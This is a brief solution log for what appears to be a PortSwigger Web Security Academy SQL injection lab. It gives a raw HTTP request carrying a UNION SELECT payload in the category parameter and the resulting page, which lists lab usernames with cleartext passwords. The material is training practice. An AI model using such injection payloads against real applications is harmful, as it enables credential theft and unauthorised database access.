https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

Payload

```http
GET /filter?category=Food+%26+Drink'+union+select+username,password+from+users-- HTTP/2
Host: 0a1800d20353c74980ffcbb200d900bd.web-security-academy.net
Cookie: session=reCGmAQUhFEenbTRyK2vv01Hohabecor
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1800d20353c74980ffcbb200d900bd.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

result:

```html
..
..
                   <table class="is-table-longdescription">
                        <tbody>
                        <tr>
                            <th>wiener</th>
                            <td>gpvcdk4dmvl1tqgq7qoz</td>
                        </tr>
                        <tr>
                            <th>administrator</th>
                            <td>8zr8rlggewx0kytnm9g5</td>
                        </tr>
                        <tr>
                            <th>carlos</th>
                            <td>158zwvpb9z1ykdg8yo16</td>
                        </tr>
                        <tr>
..
..
```

Clear text passwords found in database



